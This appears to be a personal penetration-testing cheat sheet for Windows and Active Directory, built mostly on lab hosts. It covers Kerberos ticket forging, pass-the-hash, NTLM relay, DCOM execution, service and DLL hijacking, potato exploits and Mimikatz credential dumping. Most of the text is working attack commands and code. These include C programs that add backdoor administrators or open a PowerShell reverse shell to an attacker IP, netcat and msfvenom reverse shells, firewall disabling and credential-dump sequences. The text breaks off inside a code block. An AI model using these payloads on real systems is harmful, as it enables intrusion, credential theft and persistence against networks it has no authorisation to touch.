If you are a local Administrator on this machine where iis_service (the SPN) has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service). If you have the password, you can generate the NTLM hash with codebeautify.org.

You can only use silver ticket against that host.

```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords # Looking for NTLM hash
```

To obtain the domain SID, the second piece of information we need, we can enter whoami /user to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain.

```bash
PS C:\Users\jeff> whoami /user # Looking for SID
---------------
User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369 # ignore this part -1105

mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
mimikatz # kerberos::golden /sid:S-1-5-21-1969309164-1513403977-1686805993 /user:Administrator /id:500 /domain:nagoya-industries.com /ptt /target:nagoya /service:MSSQL /rc4:e3a0168bc21cfb88b95c954a5b18f57c # i was chris and had the password of svc_mssql user
mimikatz # kerberos::golden /sid:S-1-5-21-1969309164-1513403977-1686805993 /user:Administrator /id:500 /ptt /target:nagoya.nagoya-industries.com /service:MSSQL /rc4:e3a0168bc21cfb88b95c954a5b18f57c # i was chris and had the password of svc_mssql user
mimikatz # kerberos::golden /domain: /sid: /aes128: /user:<user_name> /service: /target:
mimikatz # kerberos::golden /domain: /sid: /aes256: /user:<user_name> /service:  /target:
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

```bash
ticketer.py -nthash  -domain-sid -domain -spn TotesLegit/dc.sequel.htb administrator
ticketer.py -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid 'S-1-5-21-1969309164-1513403977-1686805993' -domain $dom -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
KRB5CCNAME=administrator.ccache mssqlclient.py  -k administrator@dc.sequel.htb
KRB5CCNAME=Administrator.ccache mssqlclient.py  -k Administrator@nagoya.nagoya-industries.com
> enable_xp_cmdshell
> xp_cmdshell whoami
```

You may need to create a /etc/krb5user.conf file.

```bash
┌──(kali㉿kali)-[~/practice/nagoya]
└─$ cat /etc/krb5user.conf
[libdefaults]
        default_realm = NAGOYA-INDUSTRIES.COM
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
        fcc-mit-ticketflags = true

[realms]
        NAGOYA-INDUSTRIES.COM = {
                kdc = nagoya.nagoya-industries.com
        }

[domain_realm]
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

We should have the ticket ready to use in memory. We can confirm this with klist, and by using the service:

```bash
PS C:\Tools> iwr -UseDefaultCredentials http://web04
```

#### Pass the Hash

First, it requires an SMB connection through the firewall (commonly port 445), and second, the Windows File and Printer Sharing feature to be enabled. These requirements are common in internal enterprise environments. This lateral movement technique also requires the admin share called ADMIN$ to be available. To establish a connection to this share, the attacker must present valid credentials with local administrative permissions. In other words, this type of lateral movement typically requires local administrative rights.

```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

#### Overpass the Path

The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. A simple way to do this is with the sekurlsa::pth command from Mimikatz.

If you run any process as another domain user on a machine you have compromised, their ntlm hash and kerberos ticket will be cached on the computer, where you can run MimiKatz to pass the hash.

```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
```

At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and does not inspect any imported Kerberos tickets

```bash
PS C:\Windows\system32> klist
PS C:\Windows\system32> net use \\files04 # We used net use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.
PS C:\Windows\system32> klist # You will now have tgt and tgs
```

We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM). 

```bash
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
```

#### Pass the Ticket

The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

```bash
PS C:\Windows\system32> ls \\web04\backup
ls : Access to the path '\\web04\backup' is denied.
mimikatz #privilege::debug
mimikatz #sekurlsa::tickets /export
PS C:\Tools> dir *.kirbi
# As many tickets have been generated, we can just pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
PS C:\Tools> klist # Since no errors, we should expect a ticket
PS C:\Tools> ls \\web04\backup # the dave ticket has been successfully imported in our own session for the jen user
```

#### DCOM

```bash
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.193.72"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

#### Net-NTLMv2

At a high level, we'll send the server a request, outlining the connection details to access the SMB share. Then the server will send us a challenge in which we encrypt data for our response with our NTLM hash to prove our identity. The server will then check our challenge response and either grant or deny access, accordingly.

Cracking:

```bash
kali@kali:~$ sudo responder -I tun0
# Try to list fake share at your Kali IP
C:\Windows\system32>dir \\192.168.119.2\test
# Save the NTLMv2 hash that is produced
kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```
Passing:

If UAC remote restrictions are enabled on the target then we can only use the local Administrator user for the relay attack. impacket-ntlmrelayx does the heavy lifting for us by setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target of our choice.

We'll use --no-http-server to disable the HTTP server since we are relaying an SMB connection and -smb2support to add support for SMB2. We'll also use -t to set the target to FILES02. Finally, we'll set our command with -c, which will be executed on the target system as the relayed user. We'll use a PowerShell reverse shell one-liner, which we'll base64-encode and execute with the -enc argument.

```bash
kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
kali@kali:~$ nc -nvlp 8080
# Now we'll run Netcat in another terminal to connect to the bind shell on FILES01 (port 5555). After we connect, we'll enter dir \\192.168.119.2\test to create an SMB connection to our Kali machine. Again, the remote folder name is arbitrary.
kali@kali:~$  nc 192.168.50.211 5555 # Simulating command execution
C:\Windows\system32>dir \\192.168.119.2\test # your kali ip
```

#### Create a Backdoor User

You can use this user to RDP into a session and obtain a GUI. This assumes that you are already NT Authority.
```bash
# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

# Enables RDP Pass the Hash
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force

# Enables RDP Connections
reg add "HTLM\SYSTEM\CurrentControlSet\Control\Terminal Server" \v "fDenyTSConnections" /t REG_DWORD /d 0 /f
...
# Disable the Firewalls
netsh advfirewall set allprofiles state off
...
net user /add backdoor Password123
net localgroup administrators /add backdoor
net localgroup "Remote Desktop Users" backdoor /add
net localgroup "Remote Desktop Users" backdoor /add

# RDP In & Allow Clipboard Sharing
xfreerdp /v:web02 /u:backdoor /p:Password123 +x clipboard /cert:ignore
```

#### Collecting Data for Bloodhound on Windows

We're using the SharpHound.ps1 from GitHub.
```bash
> . .\SharpHound.ps1
> Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName outfile.zip
```

#### Check for GPP Vulnerability

Say that you have a shell in MetaSploit, you can background that shell and run the "smb_enum_gpp" module to check if there is the GPP vulnerability in the environment.

Search in \\web02.medtech.com\sysvol\medtech.com\policies\*.xml, C:\ProgramData\Microsoft\Group Policy\history, C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history for these files: Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml, Drives.xml

#### Recursively Downloading Files with SMB

```bash
> prompt off
> recurse on
> mget *
```

#### Create a Share

```bash
> net share public=c:\\users\\public /GRANT:Everyone,FULL
```

#### NTLM v NTLMv2

NTLM hashes can be passed, NTLMv2 hashes CANNOT be passed. You must crack them. If you're on a machine without knowing their password, using responder is a great idea.


#### Execution Policy Bypass - Per User Basis

```bash
# Get the current execution policy for your current user
Get-ExecutionPolicy -Scope CurrentUser

# Attempt the modify the execution policy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

# Assure that the policy was changed
Get-ExecutionPolicy -Scope CurrentUser
```


#### Getting File from Windows Machine to Local - SCP

First, ensure the SSH service is running on your Kali machine:

```bash
sudo service ssh start
```

Then, from the Windows command line or PowerShell, transfer the file:

```powershell
scp C:\path\to\file.txt kali@<KALI_IP>:/path/to/save/
```

#### Decode Base64 in Powershell

```bash
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
```

#### Change User's Password

```bash
Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
```

#### Windows' Curl

Stay under the radar and use certutil.exe on Windows to download files from the internet, or use the classic:
```bash
certutil.exe -f -urlcache http://123.123.123.123/winPEASx64.exe winpeas.exe

iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

## When WinPEAS Fails

Use winPEAS, and if the antivirus picks that up, then try other tools such as Seatbelt and Jaws.

#### Get the Running Services

When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

#### Get Permissions of Running Services

The icacls utility outputs the corresponding principals and their permission mask.4 The most relevant permissions and their masks are listed below:
	Mask 	Permissions
	F 	Full access
	M 	Modify access
	RX 	Read and execute access
	R 	Read-only access
	W 	Write-only access

Privileges can be escalated through various permissions:

    SERVICE_CHANGE_CONFIG: Allows reconfiguration of the service binary.
    WRITE_DAC: Enables permission reconfiguration, leading to the ability to change service configurations.
    WRITE_OWNER: Permits ownership acquisition and permission reconfiguration.
    GENERIC_WRITE: Inherits the ability to change service configurations.
    GENERIC_ALL: Also inherits the ability to change service configurations.


```bash
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

If Auto is the Start Mode, you can restart the service if you can reboot the computer.

### Elevate Priviledges of Running Service Binary

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user overlord password123! /add");
  i = system ("net localgroup administrators overlord /add");
  
  return 0;
}
```
or
```c
#include <stdio.h>

int main() {
    int i;
    // Reverse shell command to your attacker machine
    i = system("powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object "
               "System.Net.Sockets.TCPClient('192.168.45.225',445);$stream = $client.GetStream();"
               "[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
               ";$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
               "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
               "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);"
               "$stream.Flush()};$client.Close()");
    return 0;
}

````
You need to cross-compile the code on our Kali machine with mingw-64.

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```bash
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  

PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

Now you need to restart the service. You can try this command first, though it will likely fail.

```bash
net stop mysqld
```

If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.

Here's how you check:

```bash
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

In order to issue a reboot, our user needs to have the privilege SeShutDownPrivilege assigned. We can use whoami with /priv to get a list of all privileges.

```bash
whoami /priv
```

If you have the SeShutDownPrivilege, then restart the computer. 

```bash
shutdown /r /t 0 /f
# as alternative
shutdown -r -t 1 /f
# powershell
Restart-Computer -Force
```

Once you're back, confirm that everything went as planned.

```bash
Get-LocalGroupMember administrators
```

We can now use *RunAs* to obtain an interactive shell. In addition, we could also use msfvenom to create an executable file, starting a reverse shell.

If you run into trouble after priv escing, try running a powershell and cmd prompt as an administrator from the get. 

#### PowerUp.ps1 (Automated Alternative)

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

```bash
# Upload the file
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1

# This function displays services the current user can modify, such as the service binary or configuration files.
Get-ModifiableServiceFile -Verbose
Invoke-AllChecks -Verbose
```

```bash
ipmo .\powerup.ps1
invoke-allchecks
sc qc vuln
sc config vuln start= demand  //Change start type
sc config vuln obj= "NT AUTHORITY\SYSTEM"  //Change owner
sc config SSDPSRV obj= ".\LocalSystem" password= "" // Or This
sc.exe config usosvc start= auto // Or this
Invoke-serviceabuse -name 'vuln' -username 'red\alice'  //Abuse
```

#### Enable service

If you are having this error (for example with SSDPSRV):

System error 1058 has occurred.
The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.

You can enable it using:

```bash
sc config vuln obj= "NT AUTHORITY\SYSTEM"  //Change owner
sc config SSDPSRV obj= ".\LocalSystem" password= "" // Or This
sc.exe config usosvc start= auto // Or this
```

#### Modify service binary path

In the scenario where the "Authenticated users" group possesses SERVICE_ALL_ACCESS on a service, modification of the service's executable binary is possible. To modify and execute sc:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

#### Restart Service

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

#### Path Injection

If you see any instance where a script or a cronjob does not specify the full path of a binary, whether it be Windows or Linux, the first thing that should come to mind is path injection. 

### Service DLL Hijacking

DLL Replacement.
Swapping a genuine DLL with a malicious one, optionally using DLL Proxying to preserve the original DLL's functionality.

DLL Search Order Hijacking:
Placing the malicious DLL in a search path ahead of the legitimate one, exploiting the application's search pattern.

Phantom DLL Hijacking. (If manual path entry that points to writable directory)
Creating a malicious DLL for an application to load, thinking it's a non-existent required DLL.

DLL Redirection:
Modifying search parameters like %PATH% or .exe.manifest / .exe.local files to direct the application to the malicious DLL.

WinSxS DLL Replacement:
Substituting the legitimate DLL with a malicious counterpart in the WinSxS directory, a method often associated with DLL side-loading.

Relative Path DLL Hijacking:
Placing the malicious DLL in a user-controlled directory with the copied application, resembling Binary Proxy Execution techniques.

NOTE: Some processes are run as NT AUTHORITY\LOCAL SERVICE, so try a reverse shell if creating user doesn't work. Once you have a shell, abuse NT AUTHORITY\LOCAL SERVICE SeImpersonatePrivilege.

Identifying unusual processes.

```bash
# Check what binaries are running, as before
Get-CimInstance -ClassName win32_service | Select * | Where-Object {$_.State -like 'Running'}
# Check for permissions on the binary if you find an interesting one
icacls .\Documents\BetaServ.exe
```

Found unusual process.

```bash
To identify and restart services using a specific DLL file on Windows:
1 Identify the Services:
    • Open Command Prompt as Administrator.
    • Use the tasklist /m wlbsctrl.dll command to list all processes using the wlbsctrl.dll file.
2 Find Service Names:
    • For each process identified, use ` sc query type= service state= all | find /i "PROCESS_NAME" ` to find the corresponding service name, replacing PROCESS_NAME with the actual process name.                                
3 Restart Services:
    • Once you have the service names, use net stop "ServiceName" followed by net start "ServiceName" for each service, replacing "ServiceName" with the actual name of the service you want to restart.     
```

```bash
sc query | findstr /i "auditTracker"
sc query | findstr /i "SQLSERVERAGENT"
sc qc <ServiceName> | findstr /i "BINARY_PATH_NAME"
net stop <ServiceName> && net start <ServiceName>
sc stop <ServiceName> && sc start <ServiceName>
sc qc "Some vulnerable service" #if the above failed check the privledges above "SERVICE_START_NAME"
whoami /priv #if the above failed check to see if you have shutdown privledges
stop-Service <ServiceName>
Start-Service <ServiceName>
Start-Process <ServiceName>
Stop-Process <ServiceName>
Restart-Service <ServiceName>
shutdown /r /t 0 /f # force that bih
# as alternative
shutdown -r -t 1 /f
# powershell
Restart-Computer -Force
```

#### Checking for permissions of all folders inside PATH (how to modify for any path)

for group in $(whoami /groups); put group in command

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

```bash
$SpecificPath = "C:\fakepath"

$output = icacls $SpecificPath 2>$null | Select-String -Pattern "(F) (M) (W) :\" | Select-String -Pattern ":\\ everyone authenticated users todos $env:username"
if ($output) { Write-Output "`n" }
```

You can also check the imports of an executable and the exports of a dll with:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

If you have read and execute permissions (RX), then see if there is a missing DLL for the binary.

You can use Process Monitor to display real-time information about any process, thread, file system, or registry related activities. Our goal is to identify all DLLs loaded by BetaService as well as detect missing ones. Once we have a list of DLLs used by the service binary, we can check their permissions and if they can be replaced with a malicious DLL. Alternatively, if find that a DLL is missing, we could try to provide our own DLL by adhering to the DLL search order.

Since you need administritave privileges to run Process Monitor, it's standard practice to copy the service binary to a local machine. On this system, we can install the service locally and use Process Monitor with administrative privileges to list all DLL activity.

```bash
sc create SchedulerService binPath= "C:\Windows\Tasks\scheduler.exe" DisplayName= "Scheduler Service" start= auto
```

If you have permissions over the service, you can modify the service's executable path:

```bash
sc config servicename binPath= "C:\Path\To\New\Service.exe"
```

Note that you can create a reverse shell dll:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.178 LPORT=443 -f dll -o beyondhelper.dll
# or
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f dll > shell.dll
```

#### Using ProcMon

Browse in the Windows Explorer to C:\tools\Procmon\ and double-click on Procmon64.exe.

For specific executable.
We enter the following arguments: Process Name as Column, is as Relation, BetaServ.exe as Value, and Include as Action. Once entered, we'll click on Add.

Blanket searching for missing DLLs.
We enter the following arguments: [ Result - Contains - not found - then Include ] & [ Path - ends with - .dll - then Include ] & just show the [] File System Activity ]. THIS MAY TAKE SOME MINUTES.

After applying the filter, the list is empty. In order to analyze the service binary, we should try restarting the service as the binary will then attempt to load the DLLs.

```bash
Restart-Service BetaService
```

Look for the Detail column to state NAME NOT FOUND for these calls, which means that a DLL with this name couldn't be found in any of these paths. You can see that the order in which the DLL is being called. There are going to be a shit ton of calls in Procmon.. take your time and check everything.

#### Dll Search Order 

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

You can verify with typing the command *$env:path* in Powershell.

See if you have the ability to write to any of the directories that the DLL is being called from.

If you do, this code can be used as a template for a DLL; note that in the case below we know that the DLL is trying to be loaded.. it's safer to spam all of the cases if you don't know what is going on.

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user overlord Password123! /add");
  	    i = system ("net localgroup administrators overlord /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Now, cross-compile the code with mingw, adding the *--shared* argument to specify that we want to build a DLL.

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

Then on the Windows machine..

```bash
cd Documents
iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
net user
Restart-Service BetaService
net user
net localgroup administrators  # Confirm that the new user is created (with administrators privileges)
```

### Writable System Path DLL Hijacking

The first thing you need is to identify a process running with more privileges than you that is trying to load a Dll from the System Path you can write in.

The problem in this cases is that probably thoses processes are already running. To find which Dlls are lacking the services you need to launch procmon as soon as possible (before processes are loaded). So, to find lacking .dlls..

	Create the folder C:\privesc_hijacking and add the path C:\privesc_hijacking to System Path env variable. You can do this manually or with PS.

```bash
# Set the folder path to create and check events for
$folderPath = "C:\privesc_hijacking"

# Create the folder if it does not exist
if (!(Test-Path $folderPath -PathType Container)) {
    New-Item -ItemType Directory -Path $folderPath | Out-Null
}

# Set the folder path in the System environment variable PATH
$envPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
if ($envPath -notlike "*$folderPath*") {
    $newPath = "$envPath;$folderPath"
    [Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine")
}
```


    Launch procmon and go to Options --> Enable boot logging and press OK in the prompt.
    Then, reboot. When the computer is restarted procmon will start recording events asap.
    Once Windows is started execute procmon again, it'll tell you that it has been running and will ask you if you want to store the events in a file. Say yes and store the events in a file.
    After the file is generated, close the opened procmon window and open the events file.
    Add these filters and you will find all the Dlls that some proccess tried to load from the writable System Path folder. [Result Y, Path Y]


### Unquoted Service Paths

We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.

You can use this script in cmd to search for these files:

```bash
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Now, you need to check if you have the permissions to start and stop the services that you (assumably) have found:

```bash
Start-Service GammaService
Stop-Service GammaService
```

Now, you need to see if you have the permissions to write in any of the vulnerable directories:

```bash
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```

You can use the same executable that we made above to replace the binary file.

```bash
iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
Start-Service GammaService
net user 
net localgroup administrators # Verify the executable worked
```

If you can't seem exploit an unquoted service path, try renaming the current service to something else, that way you're not deleting it, which can fail if the service is running or for permissions. Then, you upload your own binary and move it to the name of the original binary.

If you have permissions over the service, you can modify the service's executable path:

```bash
sc config servicename binPath= "C:\Path\To\New\Service.exe"
```

Don't forget to put everything back where it was. :)

**Automated Unquoted Service Paths Exploitation**

```bash
iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
net user
net localgroup administrators # Verify
```

### Scheduled Tasks

Find.

```bash     
$header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"

schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
```

```bash
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

For us, three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:

    As which user account (principal) does this task get executed?
    What triggers are specified for the task?
    What actions are executed when one or more of these triggers are met?

We can view scheduled tasks on Windows with the **Get-ScheduledTask** Cmdlet or the command **schtasks/query**. We'll use the latter. We enter /fo with LIST as argument to specify the output format as list. Additionally, we add /v to display all properties of a task. We should seek interesting information in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields. In our case, "interesting" means that the information partially or completely answers one of the three questions above.

```bash
schtasks /query /fo LIST /v | Select-String -Pattern "04:0" -Context 4,4 # Smart to filter the output to tasks being run in the same hour as the current time
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe # Check permissions for scheduled task
iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe # Same binary that we made for swapping binary file
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
net user
net localgroup administrators # Verify new user is created
```

```bash
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

#### IF YOU CAN WRITE TO A BAT FILE BEING EXECUTED BY A SCHEDULED TASK ->

```bash
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

#### Get-Service

If a particular file has a vulnerability and you wanna see which process it is tied to (if any), run:

```bash
get-service filename.exe
```

### SeImpersonatePrivilege

```bash
whoami /priv
```

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80
```

```bash
get-service # ensure that Spooler is running
powershell -ep bypass
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe # -i to interact w the process &  -c to specify the command we want to execute
whoami # Verify that it worked, that you are not NT AUTHORITY\SYSTEM
```

SweetPotato.

```bash
.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
```


Juicy Potato 
- Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation

```bash
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *
```

Lovely Potato (Automated Juicy Potato)
- https://github.com/TsukiCTF/Lovely-Potato
- Works only until Windows Server 2016 and Windows 10 until patch 1803

PrintSpoofer (Exploit the PrinterBug for System Impersonation)
- Works for Windows Server 2019 and Windows 10, Spooler Service needs to be on

```bash
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

RoguePotato (Upgraded Juicy Potato)
Works for Windows Server 2019 and Windows 10

GodPotato
- Best if Spooler Service isn't On, with SweetPotato coming close
- Try both NET2 and NET4 unless you know which one to use


#### Decrypt GPP Password

```bash
kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

#### Privileges Mapped to Exploits Page, such as SeImpersonate

"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens"

#### Whenever you get a Shell

```bash
Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe
```

#### UAC Bypass

Check for this in PowerUp's Invoke-AllChecks output. Follow the steps listed in "https://github.com/CsEnox/EventViewer-UACBypass". For the command, execute a msfvenom payload for a proper reverse shell, such as

```bash
Invoke-EventViewer "C:\Windows\Tasks\shell.exe"
```

#### When you Become Local Admin

Run all MimiKatz commands and save the output:

If mimikatz is acting a fool, do a one-liner.

```bash
.\mimikatz.exe
token::elevate # Makes sure commands are run as system
token::elevate /domainadmin
privilege::debug # Test if ^ is the case
log
sekurlsa::logonpasswords # Who has been on the host machine?
kerberos::list /export
kerberos::ptt ticket.kirbi # whoami will return your name pre-ptt, must test by access or executing something you couldn't before
lsadump::lsa /inject
lsadump::lsa /inject /name:krbtgt
kerberos::tgt
sekurlsa::msv
sekurlsa::ekeys
lsadump::sam
lsadump::secrets
lsadump::cache

.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "kerberos::list /export" "sekurlsa::msv" "sekurlsa::ekeys" "lsadump::sam" "lsadump::secrets" "lsadump::cache"  "exit"
```



If you see a username with a "$" at the end, this is a machine account, and cracking these passwords are infeasable at the moment. Look for service to be in Users OU, not Servers.

Impacket's secretsdump is a great alternative if you can't run mimikatz.

```bash
secretsdump.py htb.local/hacker:Hacker123\!@$ip
```

#### CrackMapExec 

To see if anybody has the same hash or password on another computer in the network:

```bash
